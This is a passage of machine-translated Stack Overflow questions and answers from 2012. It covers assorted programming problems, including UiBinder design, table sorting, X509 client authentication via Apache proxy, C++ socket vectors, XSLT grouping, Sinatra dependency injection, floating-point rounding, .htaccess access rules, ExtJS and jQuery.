1.  你是对的。GWT Designer 输出`UIBinder`XML 代码。`UIBinder`XML 代码只是一种转换为实际`Java`代码的声明性语法（就像您在 java 类中创建元素一样）。
2.  UIBinder 和 Widgets 在某种程度上无法比较。您可以将 UiBinder 与普通 Java 代码一起使用来创建小部件，但您可以仅使用 Java 代码实现具有相同功能的相同小部件。`UiBinder`只是使它更具可读性，因为它是声明性的，并且您最终不会实例化很多 UI 元素（即`TextBox textbox = new TextBox();` 和`container.add(textBox)`）
3.  我会`UiBinder`为组件和小部件使用单独的片段，然后将它们放入父 UIBinder 文件（即`Presenter`）中。然而，将每一个微小的组件（即表单的标签 + 文本框）放入单独的 UIBinder 片段中可能没有意义。你必须找到一个很好的平衡点（尽管在这个例子中，如果你使用 UiBinder 广泛使用它，你可以创建一个 Label + TextBox 组件）。
4.  如果您创建一个包含现有组件的新组件，请使用`Composite`. 如果您创建了一个独特的新小部件或组件，而该小部件或组件无法使用现有的构建，请使用`Widget`或`IsWidget`。
5.  我通常这样做：

.

*   尽可能多地使用 UIBinder。例如`LayoutPanels`用于页面结构。
*   创建您在整个应用程序中使用的主要样式`ClientBundle`和常用样式。`CSSResource`
*   `<ui:style>`当您需要只使用一次的特定样式时，将声明放在相应的 UiBinder 文件中。
*   为可重用组件创建小部件（同样您可以遵循 3 点）。

最后，Michael Davidson 提出了一些关于`MVP`测试的好观点。我强烈建议关注他们。

# javascript - 使用 html 和 Javascript 进行客户端排序

> ID：12318267
> 
> 赞同：3
> 
> 时间：2012-09-07T12:37:28.703
> 
> 标签：javascript, jquery, html, sorting, html-table

如何制作一个 html 表格，用户可以使用列标题在客户端进行排序？我可以将所有行的 html 数据加载到 Javascript 数组中，并使用 dom 将表格添加到内容 div，但这是正确的方法吗？如果您列出主要方法，我可以从那里找到我的方法，所以我不是要代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T12:42:08.567

[http://tinysort.sjeiti.com/](http://tinysort.sjeiti.com/)应该很有用

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T12:43:56.403

如果您已经使用 JS 框架，则无需重新发明轮子，但这里有一些不错的解决方案：

**TableSort** - [http://www.frequency-decoder.com/demo/table-sort-revisited/](http://www.frequency-decoder.com/demo/table-sort-revisited/)

**JQuery 表格排序器**- [http://tablesorter.com/docs/#Demo](http://tablesorter.com/docs/#Demo)

**GridView3** - [http://dev.sencha.com/playpen/ext-2.0/examples/grid/grid3.html](http://dev.sencha.com/playpen/ext-2.0/examples/grid/grid3.html)

**Stuart Langridge 的**脚本 - [http://yoast.com/articles/sortable-table/](http://yoast.com/articles/sortable-table/)

**Mootools Mootable** - [http://joomlicious.com/mootable/](http://joomlicious.com/mootable/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-07T12:46:02.740

每个 tablesorter 都是这样工作的：

1.  得到`table.tbody.rows`一个数组
2.  [使用自定义比较函数](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/sort)对该数组进行排序
3.  以正确的顺序将行附加到表体

如果您预先计算要比较的值（而不是在每次比较时访问 DOM 元素），通常会更快一些，然后数组将包含在一个槽中具有值并且在另一个槽中具有表行元素的对象。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-09-07T12:40:50.573

tablesorter 很好，但你想要一些内置过滤的东西，并且被广泛使用和支持，试试[http://datatables.net/](http://datatables.net/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-07T12:41:38.673

如果你有一个数组，那么`sort()`跟注可能是你最好的选择：

```
function sortArray(a, b){
  //could also say return a-b instead of the blown out if...else construct
  if(a.Age===b.Age) { return 0; }
  else if (a.Age < b.Age) { return -1; }
  else { return 1; }
}

var rows = [{Name: 'Amy', Age: 10}, {Name: 'Bob', Age: 20}];
var sortedArray = rows.sort(sortArray); 
```

正如其他答案所述，您也可以使用插件。 [DataTables](http://www.datatables.net/)是我过去使用过的一个很好的工具。

# django - 您将如何在 Nginx 代理后面的 Django 应用程序上管理 X509 身份验证？

> ID：12318269
> 
> 赞同：10
> 
> 时间：2012-09-07T12:37:40.827
> 
> 标签：django, nginx, x509certificate, x509

我想使用 X509 客户端身份验证来进行安全 API 访问。

X509 证书由我们的 CA (memberca) 生成。

目的是：

1.  客户端使用 SSL 连接 API
2.  持有我们 memberca 的有效 X509 证书的人可以访问它
3.  我们使用 CRL 检查证书是否被吊销。

我想，我也许可以直接在 Nginx 配置中进行管理。我该怎么做？

我可以用 Django 做吗？那我该怎么办呢？我可以使用任一解决方案将证书发送给用户吗？

例如，Nginx 可以使用 WSGI 标头映射一些证书数据，以便我可以匹配我的用户吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-07T13:56:52.803

我已经配置了类似的设置。

首先，我使用 Apache2 对用户进行身份验证。

您需要启用**mod_ssl**，并且必须（全局）定义：

*   SSLCertificateFile：指向您的 PEM 编码服务器证书；
*   SSLCertificateKeyFile：指向您的 PEM 编码服务器密钥；
*   SSLCertificateChainFile：指向您的 PEM CA 证书列表；
*   SSLCACertificatePath：指向包含所有 PEM CA 证书的文件夹；
*   SSLCACertificateFile ：指向您的 CA 证书（应与 SSLCertificateChainFile 具有相同的值）；
*   SSLCARevocationPath ：指向包含所有 CRL 的文件夹；
*   SSLCARevocationFile ：指向已撤销证书的列表（您的 ca-bundle.crl）
*   SSLCARevocationCheck 链。

现在您的服务器已准备好验证客户端 X.509 证书。

如果您不想将 apache2 用作前端 Web 服务器，则可以通过启用**mod_proxy**将其配置为反向代理。

您只需要像这样定义一个虚拟主机：

```
<VirtualHost *:443>
    ServerName test.example.com:443
    ServerAdmin webmaster@example.com

    RequestHeader set Front-End-Https "On"

    # Here I define two headers, Auth-User and Remote-User
    # They will contain the key SSL_CLIENT_S_DN_CN which is the name of the
    # client certificate's owner.
    <If "-n %{SSL_CLIENT_S_DN_CN}">
        # If the key doesn't exist, it means that the certificate wasn't sent or
        # it was revoked.

        RequestHeader set Auth-User "%{SSL_CLIENT_S_DN_CN}s"
        RequestHeader set Remote-User "%{SSL_CLIENT_S_DN_CN}s"
    </If>

    # Now enable SSL, and SSL via the proxy
    SSLEngine on
    SSLProxyEngine on

    ## Require a client certificate
    # SSLVerifyClient require
    ## NB: I prefer set it to optional, in order to allow the user
    ##     to connect to my application with a degraded mode (login+password)
    ##     It's easy to detect if the user was authenticated by apache by looking
    ##     at HTTP_AUTH_USER or HTTP_REMOTE_USER

    SSLVerifyClient optional

    # Maximum depth of CA Certificates in Client Certificate verification
    SSLVerifyDepth 4

    # Now, I pass all of this to my application, which is runned in nginx for example :
    <Location />
        ProxyPass http://<applciation host>
        ProxyPassReverse http://<applciation host>
        ProxyPreserveHost on
        # Send all informations about the client/server certificates to the application
        SSLOptions +StdEnvVars +ExportCertData
    </Location>
</VirtualHost> 
```

现在，使用 django，您只需按照[此处](https://docs.djangoproject.com/en/dev/howto/auth-remote-user/)所述启用远程身份验证后端。

从客户端证书中提取的所有信息都将发送到应用程序，因此您可以使用请求对象（和/或中间件）来使用它们。

我希望它对你有所帮助。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:31:00.597

我们通过让 mod_ssl 负责证书验证和吊销检查来使用 Apache 来做到这一点。如果证书有效且未被撤销，我们只需将证书的 CN 放入 HTTP 标头中，然后使用 Django 检索并匹配我们的用户数据库。

# c++ - 无法将套接字对象移动到 std::vector

> ID：12318274
> 
> 赞同：0
> 
> 时间：2012-09-07T12:37:59.690
> 
> 标签：c++, multithreading, sockets, c++11, stdvector

我有以下代码：

```
try
{
    HAS::TCPServerSocket servSock(echoServPort);    // Socket descriptor for server
    std::vector<HAS::TCPSocket*> sockets(MAXCONN);
    for (;;)
    {
        try
        {
            if (socketCount < MAXCONN)
            {
                HAS::TCPSocket* sock(servSock.accept());
                sockets.push_back(sock);
                std::thread handler(handleTCPClient, std::ref(sockets[socketCount++]));
                handler.detach();
            }
        }
        catch (...)
        {
            cerr << "Unable to create thread" << endl;
            exit(1);
        }
    }
} 
```

我想跟踪有限数量的连接`(MAXCONN=4)`，并希望使用`std::vector`. 不知何故，当我使用上面的代码时，`sock`变量被正确设置为当前套接字，被`servSock.accept()`. 但是，当我尝试将`sock`变量推到 sock 对象上时，`std::vector`我松开了 sock 对象。

我觉得这与正确指定复制和/或移动构造函数有关，但我已经定义了两者（并使用断点查看何时调用），但它们似乎根本没有被调用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T12:40:10.187

当您说 时，对向量元素的引用无效`push_back`。你不能以你的方式使用代码。您必须首先填充整个向量，然后再不要触摸它。或者，使用一个容器，其元素引用不会因容器突变而失效（或`list`出于一般目的，在末端插入/删除）。`multiset``unordered_multiset``deque`

或者只是将指针的*副本*传递给线程？！

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:08:19.853

```
std::vector<HAS::TCPSocket*> sockets(MAXCONN);
...
sockets.push_back(sock);
std::thread handler(handleTCPClient, std::ref(sockets[socketCount++])); 
```

这段代码看起来很有趣。该向量将包含 4 个空指针，然后是在`push_back()`调用末尾添加的实际指针。然后线程将获得对第一个空指针的引用，而不是您想要的实际指针。

您可以做以下两件事之一：我的建议是使用向量的默认构造函数，然后调用`reserve()`以保证不会发生使迭代器无效的重新分配`push_backs`。那将解决问题。或者，您可以使用元素创建向量，但不要调用`push_back()`而是使用`operator[]`来修改 position 处的元素`socketCount`。

# objective-c - NSDate 比较排除具有相同分钟的日期

> ID：12318275
> 
> 赞同：0
> 
> 时间：2012-09-07T12:38:00.513
> 
> 标签：objective-c, nsdate

我有以下 if 语句

```
if ([date compare:self.appLaunchDate] == NSOrderedDescending || [date compare:self.appLaunchDate] == NSOrderedSame) 
```

并且过滤通过的日期都大于appLaunchDate。

问题是有些日期具有相同的分钟值，但没有通过 if 语句。

如何获得大于或等于 appLaunchDate 的日期？

例如`date to check is: 2012-09-07 12:13:29 +0000 - date of launch is 2012-09-07 12:13:25 +0000`

这应该允许检查日期在启动日期之后通过，但由于某种原因，它没有通过 if 语句。

# xslt - XSLT 1.0：构建没有真正独特元素属性的子组

> ID：12318277
> 
> 赞同：1
> 
> 时间：2012-09-07T12:38:09.170
> 
> 标签：xslt, grouping

这个问题有点与我之前的问题[XSLT 1.0: using EXSLT to get element name based on substring](https://stackoverflow.com/questions/12313393/xslt-1-0-using-exslt-to-get-element-name-according-to-substring) 我有以下 XML：

```
<?xml version="1.0" encoding="UTF-8"?>
<GenericRecs>
<GenericRecord>
    <record>
        <MBH1/>
    </record>
    <record>
        <BAL1/>
    </record>
    <record>
        <MBH2/>
    </record>
    <record>
        <BAL2/>
    </record>
    <record>
        <PAY2/>
    </record>
    <record>
        <MBH3/>
    </record>
    <record>
        <BAL3/>
    </record>
    <record>
        <PAY3/>
    </record>
</GenericRecord>
</GenericRecs> 
```

我想得到这个输出：

```
<?xml version="1.0" encoding="UTF-8"?>
<list>
<Card>
    <Data>MBH1</Data>
    <Data>BAL1</Data>
</Card>
<Card>
    <Data>MBH2</Data>
    <Data>BAL2</Data>
    <Data>PAY2</Data>
</Card>
<Card>
    <Data>MBH3</Data>
    <Data>BAL3</Data>
    <Data>PAY3</Data>
</Card>
</list> 
```

在 Tomalak 的帮助下，我们提出了以下 XSLT：

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
version="1.0">
<xsl:output method="xml" indent="yes"/>

<xsl:template match="/">
    <list>
        <xsl:apply-templates select="//record/*[starts-with(name(), 'MBH')]"/>
    </list>
</xsl:template>

<xsl:template match="//record/*[starts-with(name(), 'MBH')]">
    <Card>
        <xsl:copy/>
    </Card> 
</xsl:template>

</xsl:stylesheet> 
```

但这只会给我这个输出：

```
<?xml version="1.0" encoding="UTF-8"?>
<list>
<Card>
    <MBH1/>
</Card>
<Card>
    <MBH2/>
</Card>
<Card>
    <MBH3/>
</Card>
</list> 
```

很容易唯一地识别`<MBH>`元素并列出它们。我也尝试使用匹配的键，`//record/*[not(starts-with(name(), 'MBH'))]`但当然会选择与前一个不相关的所有其他记录`<MBH>`。甚至有可能用这种结构获得想要的输出吗？XSL 怎么知道下一个元素的（变化的）元素数量`<MBH>`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:21:53.883

**这个 XSLT 1.0 转换**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:key name="kByNameSuf" match="record/*"
  use="translate(name(), translate(name(),'0123456789',''),'')"/>

 <xsl:template match="node()|@*">
     <xsl:copy>
       <xsl:apply-templates select="node()|@*"/>
     </xsl:copy>
 </xsl:template>

 <xsl:template match=
  "record[generate-id(*[1])
         =
          generate-id(key('kByNameSuf',
                           translate(name(*[1]),
                                     translate(name(*[1]),'0123456789',''),'')
                          )[1]
                      )
         ]
  ">
  <Card>
    <xsl:for-each select=
     "key('kByNameSuf',
          translate(name(*[1]),
                    translate(name(*[1]),'0123456789',''),'')
                    )
     ">
       <Data><xsl:value-of select="name()"/></Data>
    </xsl:for-each>
  </Card>
 </xsl:template>
 <xsl:template match="record"/>
</xsl:stylesheet> 
```

**应用于提供的 XML 文档时：**

```
<GenericRecs>
<GenericRecord>
    <record>
        <MBH1/>
    </record>
    <record>
        <BAL1/>
    </record>
    <record>
        <MBH2/>
    </record>
    <record>
        <BAL2/>
    </record>
    <record>
        <PAY2/>
    </record>
    <record>
        <MBH3/>
    </record>
    <record>
        <BAL3/>
    </record>
    <record>
        <PAY3/>
    </record>
</GenericRecord>
</GenericRecs> 
```

**产生想要的正确结果**：

```
<GenericRecs>
   <GenericRecord>
      <Card>
         <Data>MBH1</Data>
         <Data>BAL1</Data>
      </Card>
      <Card>
         <Data>MBH2</Data>
         <Data>BAL2</Data>
         <Data>PAY2</Data>
      </Card>
      <Card>
         <Data>MBH3</Data>
         <Data>BAL3</Data>
         <Data>PAY3</Data>
      </Card>
   </GenericRecord>
</GenericRecs> 
```

**说明**：

1.  使用 Muenchian 分组。

2.  假设仅在名称的后缀中有数字。

3.  使用*双重翻译*方法（由 Michael Kay 首次提出）。

* * *

**二、XSLT 2.0 解决方案**：

```
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:output omit-xml-declaration="yes" indent="yes"/>

 <xsl:template match="GenericRecord">
     <xsl:for-each-group select="*"
        group-by="replace(name(*[1]), '^.*(\d+)$', '$1')">
      <Card>
          <xsl:for-each select="current-group()">
            <Data><xsl:value-of select="name(*[1])"/></Data>
          </xsl:for-each>
      </Card>
     </xsl:for-each-group>
 </xsl:template>
</xsl:stylesheet> 
```

# ruby - 在 Sinatra 应用程序中注入依赖项

> ID：12318279
> 
> 赞同：12
> 
> 时间：2012-09-07T12:38:11.563
> 
> 标签：ruby, sinatra, rack

我正在编写一个调用一些外部服务的 Sinatra 应用程序。我显然希望我的测试避免调用真正的服务所以假设现在我有这个

```
class MyApp < Sinatra::Base
  get '/my_method' do
    @result = ExternalServiceHandler.new.do_request
    haml :my_view
  end
end 
```

在我的测试中

```
describe "my app" do
  include Rack::Test::Methods
  def app() MyApp end

  it "should show OK if call to external service returned OK" do
    @external_service_handler = MiniTest::Mock.new
    @external_service_handler.expect :do_request, "OK"

    #Do the injection

    get '/my_method'
    response.html.must_include "OK"
  end

  it "should show KO if call to external service returned KO" do
    @external_service_handler = MiniTest::Mock.new
    @external_service_handler.expect :do_request, "KO"

    #Do the injection

    get '/my_method'
    response.html.must_include "KO"
  end

end 
```

我可以想到两种注入方法。我可以调用实例方法或通过构造函数传递依赖项。无论如何，因为 rack 似乎没有让我访问当前的应用程序实例，所以我发现这是不可能的。

我可以为此声明一个类方法，但如果可能的话，我更喜欢使用实例。为了保持在每种情况下都有可能进行不同的注入，并避免在我忘记回滚状态时可能损害其他测试的全局状态。

有没有办法做到这一点？

提前致谢。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-12-22T04:12:51.090

似乎有几个选项。您可以通过构造函数传递依赖项，也可以使用设置。

**构造函数参数**

```
class MyApp < Sinatra::Base
    def initialize(app = nil, service = ExternalServiceHandler.new)
        super(app)
        @service = service
    end

    get "/my_method" do
        @result = @service.do_request
        haml :my_view
    end
end 
```

在规范中：

```
describe "my app" do
    include Rack::Test::Methods

    let(:app) { MyApp.new(service) }
    let(:service) { double(ExternalServiceHandler) }

    context "when the external service returns OK" do
        it "shows OK" do
            expect(service).to receive(:do_request).and_return("OK")

            get '/my_method'
            response.html.must_include "OK"
        end
    end

    context "when the external service returns KO" do
        it "shows KO" do
            expect(service).to receive(:do_request).and_return("KO")

            get '/my_method'
            response.html.must_include "KO"
        end
    end
end 
```

**设置**

```
class MyApp < Sinatra::Base
    configure do
        set :service, ::ExternalServiceHandler.new
    end

    get "/my_method" do
        @result = settings.service.do_request
        haml :my_view
    end
end 
```

在规范中：

```
describe "my app" do
    include Rack::Test::Methods

    let(:app) { MyApp.new }
    let(:service) { double(ExternalServiceHandler) }
    before do
        MyApp.set :service, service
    end

    context "when the external service returns OK" do
        it "shows OK" do
            expect(service).to receive(:do_request).and_return("OK")

            get '/my_method'
            response.html.must_include "OK"
        end
    end

    context "when the external service returns KO" do
        it "shows KO" do
            expect(service).to receive(:do_request).and_return("KO")

            get '/my_method'
            response.html.must_include "KO"
        end
    end
end 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-10T10:15:59.543

我终于设法做到了

```
describe "my app" do

  def app
    @INSTANCE
  end

  before do
    @INSTANCE ||= MyApp.new!
  end

  #tests here

end 
```

虽然我不是特别喜欢用新的！在它工作的那一刻超载。我可以使用 app.whatever_method 与每个测试一起使用的实例

# java - 如何从命令行检查 java SSL 证书是否真的在 Java 中有效？

> ID：12318281
> 
> 赞同：0
> 
> 时间：2012-09-07T12:38:12.810
> 
> 标签：java, ssl, ssl-certificate

我写了一个小的 bash 脚本，它确实在 Java 密钥库中导入了 SSL 证书，但我确实想添加一些代码来验证 Java 是否可以使用此证书建立连接（在某些情况下可能会过期，...）。

bash 脚本位于[https://gist.github.com/3164098](https://gist.github.com/3164098)，我正在寻找一种无需添加另一个 .java 文件即可对其进行测试的解决方案，仍然从网络下载已编译的测试类将被视为有效的替代方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T12:45:01.840

您可以使用此代码段：

```
System.setProperty ("javax.net.ssl.trustStore", "path_to_your_truststore");          
System.setProperty ("javax.net.ssl.trustStorePassword", "password");                 

HttpURLConnection connection = (HttpURLConnection) new URL("URL").openConnection();  

connection.setDoInput(true);                                                         
connection.setDoOutput(true);                                                        
connection.setRequestMethod("GET");                                                  

connection.connect(); 
```

# javascript - 浮点 0.2 + 0.1 舍入误差

> ID：12318283
> 
> 赞同：0
> 
> 时间：2012-09-07T12:38:18.113
> 
> 标签：javascript, floating-point

> **可能的重复：**
> [JavaScript 的数学被破坏了吗？](https://stackoverflow.com/questions/588004/is-javascripts-math-broken)

我遇到了这个四舍五入的问题：

当我这样做时：

```
 .2  + .1 results in 0.30000000000000004
 .7  + .1 results in 0.7999999999999999
1.1  + .1 results in 1.2000000000000002 
```

等等...

谁能解释（详细）为什么？可能是一些二进制舍入的东西。但我真的很想知道会发生什么……

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T12:42:46.490

简而言之，因为`.2`实际上不是 .2；它实际上是最接近的可表示双精度数，即

```
0.200000000000000011102230246251565404236316680908203125. 
```

同样，`.1`是真的

```
0.1000000000000000055511151231257827021181583404541015625 
```

当您将它们加在一起时，结果会再次四舍五入到最接近的可表示数字，即

```
0.3000000000000000444089209850062616169452667236328125 
```

最后，当您打印出来时，该数字会四舍五入为 17 位小数，给出您观察到的结果。

您的其他示例遵循相同的模式。

# .htaccess - 命令拒绝，允许不在 htaccess 中工作

> ID：12318285
> 
> 赞同：1
> 
> 时间：2012-09-07T12:38:19.303
> 
> 标签：.htaccess

我的规则在 .htaccess 中运行良好，例如强制 https。但是下面的*否认，允许*是行不通的。

```
order deny,allow
deny from all
allow from xxx.xxx.xxx.xxx 
```

.conf 可以否决 htaccess 吗？我应该注意什么？是否有任何模块可能导致此问题？.htaccess 本身有效，它只是*拒绝，允许*部分。

这个订单的原因是我可以在没有人看到的情况下开发非现场站点。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:41:08.237

您应该查看 conf 文件中的[AllowOverride](http://httpd.apache.org/docs/2.2/mod/core.html#AllowOverride)子句。他们基本上授权 .htaccess 覆盖 .conf 文件中的值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-29T07:49:58.897

这种情况经常发生在我身上，而且总是因为我没有使用我认为我正在使用的 IP 地址。这听起来很傻，但做起来却出奇的容易，因为 Internet 上的大多数计算机至少可以由两个 IP 地址表示：一个专用于 LAN，一个暴露于 Internet，通常通过启用 NAT 的路由器。

例如，我正在设置一个国家 IP 块白名单。我认为由于我与服务器在同一个局域网中，我不会从白名单开始，这将是一个很好的测试机会。但是，无论我做什么，我似乎都无法通过适当的白名单来否认自己。我忘记了我正在通过其外部 IP 访问我的服务器：我要去`home.example.com`，我已将其映射到我的路由器的 Internet IP 地址。我的路由器知道我打算环回网络，所以它是无缝的——直到我的 IP 地址很重要。

当然，有一些骇人听闻的方法可以让我在不使用 LAN IP 的情况下解决这个问题。看起来 Apache 似乎有问题，因为我可以取出一个`Allow from`语句，它会起作用。

关键是：如果它不起作用，请在 Apache 的眼中检查您的 IP 地址。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-07-03T21:30:13.287

实际问题是您定义拒绝/允许或允许/拒绝的顺序是什么？下面的文件按预期对我有用。

您的`.htaccess`文件应如下所示：

```
Order Deny,Allow
Allow from 12.99.60.128
Allow from 79.18.77.63
Allow from 181.67.136.49
Deny from All 
```

不要忘记：如果它也适合你，请竖起大拇指。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-10T15:06:59.060

我解决了这个问题，我将坏机器人块移动到每个域的 vhost 文件中，现在使用 vhost 文件来限制访问。无法为机器人在全球范围内做到这一点有点痛苦，所以如果其他人有更好的答案，我们会欢迎:)

# json - ExtJS 4 在嵌套数据加载中访问子记录

> ID：12318290
> 
> 赞同：0
> 
> 时间：2012-09-07T12:38:33.107
> 
> 标签：json, nested, extjs4

使用 ExtJS 4，我以下列方式定义了两个模型：

```
Ext.define('GlsAmCrm.model.grpModel',{
    extend: 'Ext.data.Model',   
    idProperty: 'recordid',
    fields:[
        {name: 'text', type: 'string'},
        {name: 'id', type: 'string'},
        {name: 'cls', type: 'string'},          
        {name: 'leaf', type: 'bool'}        

    ],  
    proxy: {
        type: 'ajax',
        api:{
            create: '/app/data/grpdata.php/create',
            read:'/app/data/grpdata.php/read',
            update:'/app/data/grpdata.php/update',
            destroy:'/app/data/grpdata.php/destroy'
        },      
        reader: {
            type: 'json',
            root: 'condata',
            successProperty: 'success'
        }
    },
    hasMany: {model: 'GlsAmCrm.model.conModel', name: 'condata', associationKey:'condata'}
});

Ext.define('GlsAmCrm.model.conModel',{
    extend: 'Ext.data.Model',   
    idProperty: 'recordid',
    fields:[
        {name: 'text', type: 'string'},
        {name: 'id', type: 'string'},
        {name: 'cls', type: 'string'},          
        {name: 'leaf', type: 'bool'},
        {name: 'loaded', type: 'bool'},
        {name: 'parentId', type: 'string'},
        {name: 'category', type: 'string'}

    ],
    belongsTo: 'GlsAmCrm.model.grpModel'
}); 
```

我已经使用返回 JSON 响应成功地将嵌套数据加载到树面板中：

```
{
    "condata": [
        {
            "text": "<span class=\"tree-group\">Arrowleaf Technologies</span>",
            "id": "d61c7bb7-dd88-11e1-a355-0013d3f996ae",
            "cls": "tree-root",
            "leaf": false,
            "condata": [
                {                
                    "text": "<span class=\"tree-contact\">Dos Santos, Robert A</span>",
                    "id": "1df08c59-d718-11e1-aa72-0013d3f996ae",
                    "cls": "tree-root",
                    "parentId": "d61c7bb7-dd88-11e1-a355-0013d3f996ae",
                    "leaf": true,
                    "loaded": true,
                    "category": "A"
                },
                {
                    "text": "<span class=\"tree-contact\">Interrante, Sheila D</span>",
                    "id": "0d212d01-d718-11e1-aa72-0013d3f996ae",
                    "cls": "tree-root",
                    "parentId": "d61c7bb7-dd88-11e1-a355-0013d3f996ae",
                    "leaf": true,
                    "loaded": true,
                    "category": "B"
                },
                {
                    "text": "<span class=\"tree-contact\">Sanford, Martha J</span>",
                    "id": "14e3e4cb-d718-11e1-aa72-0013d3f996ae",
                    "cls": "tree-root",
                    "parentId": "d61c7bb7-dd88-11e1-a355-0013d3f996ae",
                    "leaf": true,
                    "loaded": true,
                    "category": "C"
                },
                {
                    "text": "<span class=\"tree-contact\">Simmons, Shawn P</span>",
                    "id": "06354f92-d718-11e1-aa72-0013d3f996ae",
                    "cls": "tree-root",
                    "parentId": "d61c7bb7-dd88-11e1-a355-0013d3f996ae",
                    "leaf": true,
                    "loaded": true,
                    "category": "D"
                }
            ]
        },
        {
            "text": "<span class=\"tree-group\">Consolidated Physician Services</span>",
            "id": "bba64918-dd87-11e1-a355-0013d3f996ae",
            "cls": "tree-root",
            "leaf": false
        },
        {
            "text": "<span class=\"tree-group\">Pinellas County Schools</span>",
            "id": "ed409413-e947-11e1-a7ed-0016177c526f",
            "cls": "tree-root",
            "leaf": false
        }
    ]
} 
```

如果我展开第一个条目，我会看到所有的子叶子。如果我单击其中一个子叶（比如 Dos Santos，Robert），我想访问该子记录的“类别”字段：

```
...
listeners: {
    newselection: function(view,rec){
        console.log ("THIS IS WHERE I NEED HELP");
    }
}
... 
```

任何有关如何在此处获取子记录的见解将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:26:50.650

我对你想要什么有点困惑，但我认为就是这样：

```
listeners: {
    select: function(rowModel, record){
    console.log(record.get("category"));
    }
} 
```

# javascript - 根据选定的 li 显示相关的 li

> ID：12318295
> 
> 赞同：1
> 
> 时间：2012-09-07T12:38:40.393
> 
> 标签：javascript, jquery, html-lists, show-hide

我有一个清单：

```
<ul class="products">
  <li class="products p1">first</li>
  <li class="description p1">first</li>
  <li class="products p2">second</li>
  <li class="description p2">second</li>
  <li class="products p3">third</li>
  <li class="description p3">third</li>
  <li class="products p4">fourth</li>
  <li class="description p4">fourth</li>
</ul> 
```

并且我想使用 jquery 来：
1-当用户单击除单击的一个之外的一个时隐藏其他 li。
2-当用户再次单击活动 li 时显示所有 li。
我使用了下面的脚本：

```
$(window).load(function(){
$(".products li").click(function(){
     if ($(this).hasClass("active")) {
          $(".products li").show("slow");
          $(this).removeClass("active");
     } else {
          $(this).addClass("active");
          $(".products li:not(.active)").hide("slow");
     }
});
}); 
```

它工作正常。
现在我想显示活动 li 的相关描述 li。
例如，如果活动 li 是具有 class:p2 的 li，则需要显示以下描述 li，而其他 li 将被隐藏：

```
 <li class="description p2">second</li> 
```

描述 li 在开头是隐藏的。
我不知道如何根据类名选择正确的 li。应该有一个 jQuery 技巧来通过类名和掩码选择 li ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:45:21.720

将`.active`类添加到下一个`li`（`$(this).next().addClass("active");`），并将选择器更改为，`li.products`因为所有`li`都是可点击的：

```
$(window).load(function(){
    $(".products li.products").click(function(){
         if ($(this).hasClass("active")) {
              $(".products li").show("slow");
              $(this).removeClass("active");
              $(this).next().removeClass("active");
         } else {
              $(this).addClass("active");
              $(this).next().addClass("active");
              $(".products li:not(.active)").hide("slow");
         }
    });
}); ​​ 
```

[JSFiddle 示例](http://jsfiddle.net/XKCx7/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:45:33.450

尝试使用`.next()`jQuery 函数。由于描述始终是`li`活动元素的下一个元素，因此您应该能够获取下一个兄弟元素并使用`.show()`.

```
.next():

Get the immediately following sibling of each element in the set of matched elements. If a   
selector is provided, it retrieves the next sibling only if it matches that selector. 
```

[http://api.jquery.com/next/](http://api.jquery.com/next/)

# android - Android 虚拟设备需要太多时间来加载操作系统

> ID：12318306
> 
> 赞同：3
> 
> 时间：2012-09-07T12:39:03.633
> 
> 标签：android, android-emulator

我是android应用程序开发的新手。当我安装了开发所需的所有软件包时，我运行了模拟器并浏览了 Android 操作系统。这意味着模拟器已完美安装。但是当我尝试运行我的第一个应用程序时，模拟器花费了太多时间来加载操作系统。我等了大约 15 分钟，但它仍在加载和加载。然后我把它关了。然后我也尝试从设备管理器运行它，但它也无法加载操作系统。那么我该如何解决这个问题呢？

在我的模拟器中，启用了“快照”选项。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:47:13.680

您已启用快照。如果您启用它，那么您可能会尝试打开错误保存的快照。如果是这样，在使用启动选项启动模拟器时，取消选中从启动启动。

希望它会帮助你。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-27T17:31:32.433

进入“Android Virtual device manager”，选择AVD并点击edit，选择设备“HVGA”，点击ok。现在运行您的项目。模拟器将在 2-3 分钟内出现。

# gdb - 如何使用 gdb 在 PPC 上查看 DAR（数据访问寄存器）的内容？

> ID：12318310
> 
> 赞同：2
> 
> 时间：2012-09-07T12:39:18.503
> 
> 标签：gdb, embedded

我正在嵌入式 PPC 平台（拱门是 ppc750）上进行调试，我注意到当二进制文件崩溃时，如果我在 gdb 中键入“信息寄存器”，我看不到 DAR（数据访问寄存器）的内容，它应该显示程序试图读取的内存地址 - 我只得到告诉我异常类型的陷阱寄存器：

```
(gdb) info registers
 r0             0x1034875e       271877982
 r1             0x7fffed30       2147478832
 r2             0xfd7f7a0        265811872
 [...]
 pc             0xf18d718        0xf18d718
